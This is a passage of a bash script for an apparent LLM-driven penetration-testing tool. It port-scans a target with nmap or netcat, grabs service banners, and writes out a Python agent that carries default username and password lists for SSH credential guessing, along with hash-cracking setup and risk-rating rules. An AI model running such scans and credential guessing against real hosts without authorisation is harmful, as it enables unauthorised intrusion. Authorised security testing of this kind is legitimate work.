      if [[ "${_ans:-y}" =~ ^[Yy]$ ]]; then
        printf "\n"; brew install "$_tool"; printf "\n"
      else
        printf "  ${D}Skipping %s (some features will be limited).${R}\n\n" "$_tool"
      fi
    else
      printf "  ${Y}Homebrew not found.${R}  ${D}Install from https://brew.sh  then run: brew install %s${R}\n\n" "$_tool"
    fi
  }
  command -v nmap    &>/dev/null || _brew_install nmap    "needed for port/service scanning"
  command -v sshpass &>/dev/null || _brew_install sshpass "needed for SSH credential testing"
  { command -v hashcat &>/dev/null || command -v john &>/dev/null; } || _brew_install hashcat "needed for hash cracking"

  printf "  ${D}Connecting to Ollama at %s...${R}\n" "$ATTACK_OLLAMA"
  local tags_json
  tags_json=$(curl -sf --max-time 5 "http://${ATTACK_OLLAMA}/api/tags" 2>/dev/null || true)
  if [ -z "$tags_json" ]; then
    printf "  ${RE}Ollama not reachable at http://%s${R}\n" "$ATTACK_OLLAMA"
    printf "  ${D}Run: ollama serve   or configure: killport config${R}\n\n"
    return 1
  fi

  local MODEL="$ATTACK_MODEL"
  if [ -z "$MODEL" ]; then
    MODEL=$(printf '%s' "$tags_json" | python3 -c \
      "import json,sys; d=json.load(sys.stdin); print(d['models'][0]['name'] if d.get('models') else '')" 2>/dev/null || true)
  fi
  [ -z "$MODEL" ] && { printf "  ${Y}No models loaded. Run: ollama pull llama3.2${R}\n\n"; return 1; }
  printf "  ${D}Model: %s${R}\n\n" "$MODEL"

  local COMMON_PORTS=(21 22 23 25 53 80 110 143 389 443 445 465 587 993 995 1433 1521 \
         2181 3000 3001 3306 3389 4000 4200 4848 5000 5173 5432 5672 5900 \
         6379 6443 7001 7474 8000 8080 8081 8443 8888 9000 9090 9200 9300 \
         11211 27017 28017 50070)

  local PORTS_DESC
  if [ -n "$SINGLE_PORT" ]; then
    PORTS_DESC="port $SINGLE_PORT"
  elif [ -n "$FULL_SCAN" ]; then
    PORTS_DESC="all 65535 ports"
  else
    PORTS_DESC="${#COMMON_PORTS[@]} common ports"
  fi

  local found_count=0 service_lines=""

  _nmap_parse() {
    local np ns nv
    np=$(printf '%s' "$1" | awk '{print $1}' | cut -d/ -f1)
    ns=$(printf '%s' "$1" | awk '{print $3}')
    nv=$(printf '%s' "$1" | awk '{for(i=4;i<=NF;i++) printf $i" ";}' | sed 's/ *$//')
    printf "  ${G}●${R}  ${B}%-8s${R}  %-14s  ${D}%s${R}\n" "$np" "$ns" "$nv"
    (( found_count++ )) || true
    service_lines+="port ${np}/tcp: ${ns} ${nv}"$'\n'
  }

  if [ -n "$SINGLE_PORT" ]; then
    printf "  ${B}Scanning port %s on %s...${R}\n\n" "$SINGLE_PORT" "$TARGET"
    if command -v nmap &>/dev/null; then
      while IFS= read -r nline; do _nmap_parse "$nline"; done \
        < <(nmap -p "$SINGLE_PORT" --open -sV -T4 "$TARGET" 2>/dev/null | grep "^[0-9]" || true)
    else
      nc -z -w2 "$TARGET" "$SINGLE_PORT" 2>/dev/null && {
        local banner; banner=$(printf '\r\n' | nc -w2 "$TARGET" "$SINGLE_PORT" 2>/dev/null | tr -cd '[:print:] ' | head -c 120 || true)
        printf "  ${G}●${R}  ${B}%-8s${R}  ${D}%s${R}\n" "$SINGLE_PORT" "${banner:0:60}"
        (( found_count++ )) || true
        service_lines+="port ${SINGLE_PORT}/tcp: ${banner:0:100}"$'\n'
      }
    fi
  else
    # ── Pass 1: common ports ──────────────────────────────
    local pass_label; [ -n "$FULL_SCAN" ] && pass_label="Pass 1/2  " || pass_label=""
    printf "  ${B}%sScanning %d common ports on %s...${R}\n\n" "$pass_label" "${#COMMON_PORTS[@]}" "$TARGET"
    if command -v nmap &>/dev/null; then
      local common_csv; common_csv=$(IFS=,; echo "${COMMON_PORTS[*]}")
      while IFS= read -r nline; do _nmap_parse "$nline"; done \
        < <(nmap -p "$common_csv" --open -sV -T4 "$TARGET" 2>/dev/null | grep "^[0-9]" || true)
    else
      local t1; t1=$(mktemp)
      for port in "${COMMON_PORTS[@]}"; do
        ( nc -z -w1 "$TARGET" "$port" 2>/dev/null && printf "%05d\n" "$port" >> "$t1" ) &
      done; wait
      if [ -s "$t1" ]; then
        while IFS= read -r padded; do
          local p=$(( 10#$padded )) banner
          banner=$(printf '\r\n' | nc -w2 "$TARGET" "$p" 2>/dev/null | tr -cd '[:print:] ' | head -c 120 || true)
          printf "  ${G}●${R}  ${B}%-8s${R}  ${D}%s${R}\n" "$p" "${banner:0:60}"
          (( found_count++ )) || true
          service_lines+="port ${p}/tcp: ${banner:0:100}"$'\n'
        done < <(sort "$t1")
      fi
      rm -f "$t1"
    fi

    # ── Pass 2: full sweep 1-65535 (only when allports) ──
    if [ -n "$FULL_SCAN" ]; then
      printf "\n  ${B}Pass 2/2${R}  ${D}scanning remaining 65535 ports on %s...${R}\n\n" "$TARGET"
      local common_set; common_set=" ${COMMON_PORTS[*]} "
      if command -v nmap &>/dev/null; then
        # progress bar fed by nmap's stderr timing lines
        local _prog=0 _bar_width=40
        _draw_bar() {
          local pct=$1 filled=$(( $1 * _bar_width / 100 ))
          local bar=""; local i=0
          while (( i < filled )); do bar+="█"; (( i++ )) || true; done
          while (( i < _bar_width )); do bar+="░"; (( i++ )) || true; done
          printf "  [%s] %3d%%\r" "$bar" "$pct"
        }
        _draw_bar 0
        while IFS= read -r nline; do
          if [[ "$nline" =~ ^[0-9] ]]; then
            local _p; _p=$(printf '%s' "$nline" | awk '{print $1}' | cut -d/ -f1)
            [[ "$common_set" == *" $_p "* ]] && continue
            printf "\033[2K"   # clear progress line before printing a port
            _nmap_parse "$nline"
            _draw_bar "$_prog"
          elif [[ "$nline" =~ ([0-9]+)%\ done ]]; then
            _prog="${BASH_REMATCH[1]}"
            _draw_bar "$_prog"
          fi
        done < <(nmap -p- --open -sV -T4 --stats-every 3s "$TARGET" 2>&1 | grep -E "^[0-9]|% done" || true)
        printf "\033[2K  ${G}Pass 2/2 complete.${R}\n\n"
      else
        local t2; t2=$(mktemp)
        local _total=65535 _done=0 _bar_width=40
        _draw_bar2() {
          local filled=$(( $1 * _bar_width / _total ))
          local pct=$(( $1 * 100 / _total ))
          local bar=""; local i=0
          while (( i < filled )); do bar+="█"; (( i++ )) || true; done
          while (( i < _bar_width )); do bar+="░"; (( i++ )) || true; done
          printf "  [%s] %3d%%  (%d / %d)\r" "$bar" "$pct" "$1" "$_total"
        }
        _draw_bar2 0
        for port in $(seq 1 65535); do
          [[ "$common_set" == *" $port "* ]] && { (( _done++ )) || true; continue; }
          ( nc -z -w1 "$TARGET" "$port" 2>/dev/null && printf "%05d\n" "$port" >> "$t2" ) &
          (( _done++ )) || true
          (( port % 500 == 0 )) && { wait; _draw_bar2 "$_done"; }
        done; wait
        printf "\033[2K  ${G}Pass 2/2 complete.${R}\n\n"
        if [ -s "$t2" ]; then
          while IFS= read -r padded; do
            local p=$(( 10#$padded )) banner
            banner=$(printf '\r\n' | nc -w2 "$TARGET" "$p" 2>/dev/null | tr -cd '[:print:] ' | head -c 120 || true)
            printf "  ${G}●${R}  ${B}%-8s${R}  ${D}%s${R}\n" "$p" "${banner:0:60}"
            (( found_count++ )) || true
            service_lines+="port ${p}/tcp: ${banner:0:100}"$'\n'
          done < <(sort "$t2")
        fi
        rm -f "$t2"
      fi
    fi
  fi

  if [ "$found_count" -eq 0 ]; then
    printf "  ${D}No open ports found on %s${R}\n\n" "$TARGET"
    attack_log_write "$TARGET" "$MODEL" "$PORTS_DESC" "No open ports found."
    return 0
  fi

  # ── Wordlist depth ────────────────────────────────────
  printf "\n  ${B}Credential testing depth:${R}\n\n"
  printf "    ${B}1  quick ${R}  ${D}~30 sec   top 3 users × 5 passwords${R}\n"
  printf "    ${B}2  common${R}  ${D}~2 min    top 5 users × 10 passwords${R}  ${G}(default)${R}\n"
  printf "    ${B}3  deep  ${R}  ${D}~10 min   top 10 users × 30 passwords${R}\n"
  local _depth_sel="" _secs=15
  while [ "$_secs" -gt 0 ]; do
    printf "\r  ${G}[%2ds]${R}  ${D}Auto-selecting common — or type 1 / 2 / 3 + Enter:${R}  " "$_secs"
    if IFS= read -r -t 1 _depth_sel; then break; fi
    (( _secs-- )) || true
  done
  printf "\r  %-70s\r\n" " "
  local KP_DEPTH="common"
  case "${_depth_sel:-2}" in
    1|quick)  KP_DEPTH="quick"  ;;
    3|deep)   KP_DEPTH="deep"   ;;
    *)        KP_DEPTH="common" ;;
  esac
  printf "\n"

  # ── Agentic investigation ─────────────────────────────
  local py_agent="/tmp/kp_agent_$$_$RANDOM.py"
  trap 'rm -f "$py_agent" 2>/dev/null' EXIT INT TERM
  cat > "$py_agent" <<'PYEOF'
import json, os, sys, subprocess, re, time, datetime

OLLAMA  = os.environ["KP_OLLAMA"]
MODEL   = os.environ["KP_MODEL"]
TARGET  = os.environ["KP_TARGET"]
INITIAL = os.environ["KP_SERVICES"]
DEPTH   = os.environ.get("KP_DEPTH","common")
MAX_IT  = 20

_USERS = {
    "quick":  ["admin","root","ubuntu"],
    "common": ["admin","root","ubuntu","user","pi"],
    "deep":   ["admin","root","ubuntu","user","pi","test","guest","oracle","postgres","ftp"],
}
_PASSES = {
    "quick":  ["","admin","password","123456","root"],
    "common": ["","admin","password","123456","root","1234","pass","test","guest","raspberry"],
    "deep":   ["","admin","password","123456","root","1234","pass","test","guest","raspberry",
               "letmein","welcome","admin123","password1","abc123","111111","ubuntu",
               "changeme","default","qwerty","12345","12345678","dragon","master",
               "trustno1","sunshine","raspberry","shadow","superman","football","monkey"],
}
TOP_USERS  = _USERS.get(DEPTH,  _USERS["common"])
TOP_PASSES = _PASSES.get(DEPTH, _PASSES["common"])

C='\033[0;36m'; G='\033[0;32m'; Y='\033[0;33m'; RE='\033[0;31m'
D='\033[2m';    B='\033[1m';    R='\033[0m'

# ── Structured findings store ────────────────────────────
# findings[port] = {service, version, banner, creds_ok, no_auth,
#                   paths_found, hashes, cracked, notes, raw_scan}
findings = {}

def ensure_port(port):
    if port not in findings:
        findings[port] = dict(service="",version="",banner="",
            creds_ok=[],no_auth=False,paths_found=[],
            hashes=[],cracked=[],notes=[],raw_scan="")

# ── Risk rules (deterministic, not LLM) ──────────────────
RISK_RULES = {
    "critical": lambda d: d["no_auth"] or bool(d["creds_ok"]) or d.get("port") in ("23",),
    "high":     lambda d: bool(d["paths_found"]) or d["service"] in ("ftp","redis","mongodb","mysql","postgres","postgresql","telnet"),
    "medium":   lambda d: d["service"] in ("ssh","http","https","smtp","imap","pop3"),
    "low":      lambda d: True,
}
RISK_ICON = {"critical":"🔴 Critical","high":"🟠 High","medium":"🟡 Medium","low":"🟢 Low"}

def risk_level(port_data):
    for level, check in RISK_RULES.items():
        if check(port_data): return level
    return "low"

